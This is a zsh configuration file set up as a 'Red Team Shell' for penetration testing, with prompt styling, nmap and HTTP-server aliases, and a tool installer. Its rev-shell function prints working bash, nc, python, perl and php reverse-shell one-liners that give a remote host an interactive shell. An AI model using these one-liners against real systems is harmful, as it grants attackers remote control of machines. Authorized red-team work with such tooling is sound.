# ~/.zshrc file for zsh interactive shells.
# see /usr/share/doc/zsh/examples/zshrc for examples

# ----------------------
# Red Team Shell
# ----------------------
if command -v figlet &> /dev/null; then
    figlet -f slant "Red Team Shell" | lolcat
fi

setopt autocd              # change directory just by typing its name
setopt correct            # auto correct mistakes
setopt interactivecomments # allow comments in interactive mode
setopt magicequalsubst     # enable filename expansion for arguments of the form ‘anything=expression’
setopt nonomatch           # hide error message if there is no match for the pattern
setopt notify              # report the status of background jobs immediately
setopt numericglobsort     # sort filenames numerically when it makes sense
setopt promptsubst         # enable command substitution in prompt

WORDCHARS=${WORDCHARS//\/} # Don't consider certain characters part of the word

# hide EOL sign ('%')
PROMPT_EOL_MARK=""

# configure key keybindings
# configure key keybindings
bindkey -e                                        # emacs key bindings
bindkey ' ' magic-space                           # do history expansion on space
bindkey '^[[3;5~' kill-word                       # ctrl + Supr
bindkey '^[[3~' delete-char                       # delete
bindkey '^[[1;5C' forward-word                    # ctrl + ->
bindkey '^[[1;5D' backward-word                   # ctrl + <-
bindkey '^[[5~' beginning-of-buffer-or-history    # page up
bindkey '^[[6~' end-of-buffer-or-history          # page down
bindkey '^[[H' beginning-of-line                  # home
bindkey '^[[F' end-of-line                        # end
bindkey '^[[Z' undo                               # shift + tab undo last action

# enable completion features
autoload -Uz compinit
compinit -d ~/.cache/zcompdump
zstyle ':completion:*:*:*:*:*' menu select
zstyle ':completion:*' matcher-list 'm:{a-zA-Z}={A-Za-z}' # case insensitive tab completion

# History configurations
HISTFILE=~/.zsh_history
HISTSIZE=1000
SAVEHIST=2000
setopt hist_expire_dups_first # delete duplicates first when HISTFILE size exceeds HISTSIZE
setopt hist_ignore_dups       # ignore duplicated commands history list
setopt hist_ignore_space      # ignore commands that start with space
setopt hist_verify            # show command with history expansion to user before running it
#setopt share_history         # share command history data

# force zsh to show the complete history
alias history="history 0"

# make less more friendly for non-text input files, see lesspipe(1)
#[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
        # We have color support; assume it's compliant with Ecma-48
        # (ISO/IEC-6429). (Lack of such support is extremely rare, and such
        # a case would tend to support setf rather than setaf.)
        color_prompt=yes
    else
        color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    PROMPT='%F{%(#.blue.green)}%n@%m%b %F{blue}%~%f %F{red}$%f '
    RPROMPT='%(?.. %? %F{red}%B⨯%b%F{reset})%(1j. %j %F{yellow}%B⚙%b%F{reset}.)'


    # enable syntax-highlighting
    if [ -f /usr/local/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh ] && [ "$color_prompt" = yes ]; then
        . /usr/local/share/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh
        ZSH_HIGHLIGHT_HIGHLIGHTERS=(main brackets pattern)
        ZSH_HIGHLIGHT_STYLES[default]=none
        ZSH_HIGHLIGHT_STYLES[unknown-token]=fg=red,bold
        ZSH_HIGHLIGHT_STYLES[reserved-word]=fg=cyan,bold
        ZSH_HIGHLIGHT_STYLES[suffix-alias]=fg=green,underline
        ZSH_HIGHLIGHT_STYLES[global-alias]=fg=magenta
        ZSH_HIGHLIGHT_STYLES[precommand]=fg=green,underline
        ZSH_HIGHLIGHT_STYLES[commandseparator]=fg=blue,bold
        ZSH_HIGHLIGHT_STYLES[autodirectory]=fg=green,underline
        ZSH_HIGHLIGHT_STYLES[path]=underline
        ZSH_HIGHLIGHT_STYLES[path_pathseparator]=
        ZSH_HIGHLIGHT_STYLES[path_prefix_pathseparator]=
        ZSH_HIGHLIGHT_STYLES[globbing]=fg=blue,bold
        ZSH_HIGHLIGHT_STYLES[history-expansion]=fg=blue,bold
        ZSH_HIGHLIGHT_STYLES[command-substitution]=none
        ZSH_HIGHLIGHT_STYLES[command-substitution-delimiter]=fg=magenta
        ZSH_HIGHLIGHT_STYLES[process-substitution]=none
        ZSH_HIGHLIGHT_STYLES[process-substitution-delimiter]=fg=magenta
        ZSH_HIGHLIGHT_STYLES[single-hyphen-option]=fg=magenta
        ZSH_HIGHLIGHT_STYLES[double-hyphen-option]=fg=magenta
        ZSH_HIGHLIGHT_STYLES[back-quoted-argument]=none
        ZSH_HIGHLIGHT_STYLES[back-quoted-argument-delimiter]=fg=blue,bold
        ZSH_HIGHLIGHT_STYLES[single-quoted-argument]=fg=yellow
        ZSH_HIGHLIGHT_STYLES[double-quoted-argument]=fg=yellow
        ZSH_HIGHLIGHT_STYLES[dollar-quoted-argument]=fg=yellow
        ZSH_HIGHLIGHT_STYLES[rc-quote]=fg=magenta
        ZSH_HIGHLIGHT_STYLES[dollar-double-quoted-argument]=fg=magenta
        ZSH_HIGHLIGHT_STYLES[back-double-quoted-argument]=fg=magenta
        ZSH_HIGHLIGHT_STYLES[back-dollar-quoted-argument]=fg=magenta
        ZSH_HIGHLIGHT_STYLES[assign]=none
        ZSH_HIGHLIGHT_STYLES[redirection]=fg=blue,bold
        ZSH_HIGHLIGHT_STYLES[comment]=fg=black,bold
        ZSH_HIGHLIGHT_STYLES[named-fd]=none
        ZSH_HIGHLIGHT_STYLES[numeric-fd]=none
        ZSH_HIGHLIGHT_STYLES[arg0]=fg=green
        ZSH_HIGHLIGHT_STYLES[bracket-error]=fg=red,bold
        ZSH_HIGHLIGHT_STYLES[bracket-level-1]=fg=blue,bold
        ZSH_HIGHLIGHT_STYLES[bracket-level-2]=fg=green,bold
        ZSH_HIGHLIGHT_STYLES[bracket-level-3]=fg=magenta,bold
        ZSH_HIGHLIGHT_STYLES[bracket-level-4]=fg=yellow,bold
        ZSH_HIGHLIGHT_STYLES[bracket-level-5]=fg=cyan,bold
        ZSH_HIGHLIGHT_STYLES[cursor-matchingbracket]=standout
    fi
else
    PROMPT='${debian_chroot:+($debian_chroot)}%n@%m:%~%# '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
    TERM_TITLE=$'\e]0;${debian_chroot:+($debian_chroot)}%n@%m: %~\a'
    ;;
*)
    ;;
esac

new_line_before_prompt=yes
precmd() {
    # Print the previously configured title
    print -Pnr -- "$TERM_TITLE"

    # Print a new line before the prompt, but only if it is not the first line
    if [ "$new_line_before_prompt" = yes ]; then
        if [ -z "$_NEW_LINE_BEFORE_PROMPT" ]; then
            _NEW_LINE_BEFORE_PROMPT=1
        else
            print ""
        fi
    fi
}

# enable color support of ls, less and man, and also add handy aliases
	export CLICOLOR=YES
    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
    alias diff='diff --color=auto'
    alias ip='ip --color=auto'

# some more ls aliases
alias ll='ls -l'
alias la='ls -A'
alias l='ls -CF'

# enable auto-suggestions based on the history
if [ -f /usr/local/share/zsh-autosuggestions/zsh-autosuggestions.zsh ]; then
    . /usr/local/share/zsh-autosuggestions/zsh-autosuggestions.zsh
    # change suggestion color
    ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE='fg=#999'
fi

# ----------------------
# Red Team Operations
# ----------------------

# -- Web Servers --
# Start a simple HTTP server
alias http-server='python3 -m http.server'
# Start a simple HTTPS server. Requires cert.pem and key.pem.
# Generate with: openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
alias https-server='python3 -m http.server --cert-file=cert.pem --key-file=key.pem'

# -- Nmap --
# Scan top 1000 TCP ports with service and version detection
alias nmap-top-ports='nmap -sV -sC --top-ports=1000'

# -- Reverse Shells --
# Generate reverse shell one-liners
rev-shell() {
    echo "Usage: rev-shell <type> <lhost> <lport>"
    echo "Types: bash, nc, python, perl, php"
    case "$1" in
        bash)
            echo "bash -i >& /dev/tcp/$2/$3 0>&1"
            ;;
        nc)
            echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $2 $3 >/tmp/f"
            ;;
        python)
            echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$2",$3));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
            ;;
        perl)
            echo "perl -e 'use Socket;$i=\"$2\";$p=$3;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">\\&S\");open(STDOUT,\">\\&S\");open(STDERR,\">\\&S\");exec(\"/bin/sh -i\");};'"
            ;;
        php)
            echo "php -r '$sock=fsockopen(\"$2\",$3);exec(\"/bin/sh -i <\\&3 >\\&3 2\\&3\");'"
            ;;
    esac
}

# -- Prompt --
# Show tun0 IP in prompt
get_tun0_ip() {
    ip addr show tun0 2>/dev/null | awk '/inet / {print $2}' | cut -d/ -f1
}




# -- Tool Check --
# Check for Homebrew and install if not found
install_homebrew() {
    if ! command -v brew &> /dev/null; then
        read "response?Homebrew not found. Install it now? [y/N] "
        if [[ "$response" =~ ^([yY][eE][sS]|[yY])$ ]]; then
            /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
        fi
    fi
}

# Check for the presence of common red team tools and prompt to install them
check_tools() {
    install_homebrew
    brew_tools=("nmap" "socat" "gobuster" "feroxbuster" "figlet" "lolcat")
    pip_tools=()
    gem_tools=()
    installed_brew_tools=()
    installed_pip_tools=()
    installed_gem_tools=()
    missing_brew_tools=()
    missing_pip_tools=()
    missing_gem_tools=()

    for tool in "${brew_tools[@]}"; do
        if command -v $tool &> /dev/null; then
            installed_brew_tools+=($tool)
        else
            missing_brew_tools+=($tool)
        fi
    done

    for tool in "${pip_tools[@]}"; do
        if python3 -m pip show $tool &> /dev/null; then
            installed_pip_tools+=($tool)
        else
            missing_pip_tools+=($tool)
        fi
    done

    for tool in "${gem_tools[@]}"; do
        if gem list -i $tool &> /dev/null; then
            installed_gem_tools+=($tool)
        else
            missing_gem_tools+=($tool)
        fi
    done

    if [ ${#installed_brew_tools[@]} -gt 0 ] || [ ${#installed_pip_tools[@]} -gt 0 ] || [ ${#installed_gem_tools[@]} -gt 0 ]; then
        echo "The following tools are already installed:"
        if [ ${#installed_brew_tools[@]} -gt 0 ]; then
            echo "  Homebrew: ${installed_brew_tools[@]}"
        fi
        if [ ${#installed_pip_tools[@]} -gt 0 ]; then
            echo "  Pip: ${installed_pip_tools[@]}"
        fi
        if [ ${#gem_tools[@]} -gt 0 ]; then
            echo "  Gem: ${installed_gem_tools[@]}"
        fi
    fi

    if [ ${#missing_brew_tools[@]} -gt 0 ] || [ ${#missing_pip_tools[@]} -gt 0 ] || [ ${#missing_gem_tools[@]} -gt 0 ]; then
        echo "The following tools are not installed:"
        if [ ${#missing_brew_tools[@]} -gt 0 ]; then
            echo "  Homebrew: ${missing_brew_tools[@]}"
        fi
        if [ ${#missing_pip_tools[@]} -gt 0 ]; then
            echo "  Pip: ${missing_pip_tools[@]}"
        fi
        if [ ${#missing_gem_tools[@]} -gt 0 ]; then
            echo "  Gem: ${missing_gem_tools[@]}"
        fi

        read "response?Install them now? [y/N] "
        if [[ "$response" =~ ^([yY][eE][sS]|[yY])$ ]]; then
            if [ ${#missing_brew_tools[@]} -gt 0 ]; then
                # Note: metasploit is deprecated and will be removed from Homebrew in the future
                brew install ${missing_brew_tools[@]}
            fi
            if [ ${#missing_pip_tools[@]} -gt 0 ]; then
                python3 -m pip install ${missing_pip_tools[@]}
            fi
            if [ ${#missing_gem_tools[@]} -gt 0 ]; then
                gem install ${missing_gem_tools[@]}
            fi
        fi
    fi
}

# Homebrew Maintenance
run_brew_maintenance() {
    if [ -f ~/.brew_last_update ]; then
        last_update=$(cat ~/.brew_last_update)
        now=$(date +%s)
        if [ $((now - last_update)) -gt 86400 ]; then
            echo "Running Homebrew maintenance..."
            brew update && brew upgrade && brew cleanup -s
            echo $(date +%s) > ~/.brew_last_update
        fi
    else
        echo $(date +%s) > ~/.brew_last_update
    fi
}

# Run the tool check and brew maintenance
check_tools
run_brew_maintenance
echo "Type /help for a list of commands."

# -- Help Command --
# Display a list of aliases and functions
/help() {
    echo "
    Available Aliases and Functions:

    http-server: Start a simple HTTP server
    https-server: Start a simple HTTPS server
    nmap-top-ports: Scan top 1000 TCP ports with service and version detection
    rev-shell <type> <lhost> <lport>: Generate a reverse shell one-liner
    check_tools: Check for and install missing tools
    run_brew_maintenance: Run Homebrew maintenance (update, upgrade, cleanup)
    /help: Display this help message

    Tmux:

    Prefix + P: Start/Stop asciinema recording of the current pane to ~/Logs/.
                Use 'asciinema play FILENAME' to play back.
    N: Create a new tmux session.
    p: Switch to previous tmux window.
    n: Switch to next tmux window.
    "
}




